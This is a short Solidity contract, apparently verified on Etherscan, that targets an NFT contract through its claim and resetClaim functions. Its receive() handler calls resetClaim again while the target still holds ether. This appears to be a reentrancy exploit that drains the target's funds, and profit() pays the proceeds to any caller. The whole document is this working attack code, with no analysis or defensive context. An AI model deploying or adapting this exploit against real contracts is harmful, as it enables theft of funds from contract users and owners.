/**
 *Submitted for verification at Etherscan.io on 2021-09-24
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IMaticNFT {
    function claim(uint256 tokenId) external payable;
    function resetClaim() external;
}

contract Taker {
    IMaticNFT maticNFT;

    constructor(address nft) {
        maticNFT = IMaticNFT(nft);
    }

    function balance() public view returns(uint256) {
        return address(this).balance;
    }

    function profit() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function claim(uint256 tokenId) public payable {
        require(msg.value >= 1 ether, "Need more than 1 ehter!");
        maticNFT.claim{value: msg.value}(tokenId);
    }
    
    function resetClaim() public {
        maticNFT.resetClaim();
    }
    
	// For accept NFT from other smart contract
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    receive() external payable {
        if (address(maticNFT).balance > 10 wei) {
            maticNFT.resetClaim();
        }
    }
}